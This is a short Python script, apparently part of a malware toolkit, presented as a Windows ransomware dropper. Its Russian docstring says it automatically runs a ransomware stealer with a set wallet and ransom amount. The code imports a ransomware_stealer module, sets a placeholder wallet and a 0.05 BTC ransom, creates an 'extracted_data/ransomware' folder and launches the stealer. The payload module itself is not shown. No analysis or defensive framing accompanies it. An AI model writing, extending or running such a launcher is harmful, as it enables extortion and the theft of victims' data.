#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ransomware Dropper (Windows)
Автоматически запускает ransomware_stealer с заданным кошельком и суммой выкупа
"""
import os
import sys
from agent_modules import ransomware_stealer

def main():
    wallet = "analalalalala"
    ransom_amount = "0.05 BTC"
    output_dir = os.path.join(os.getcwd(), "extracted_data/ransomware")
    os.makedirs(output_dir, exist_ok=True)
    stealer = ransomware_stealer.RansomwareStealer(output_dir=output_dir, wallet_address=wallet, ransom_amount=ransom_amount)
    result = stealer.run()
    print("[RANSOMWARE]", result)

if __name__ == "__main__":
    main() 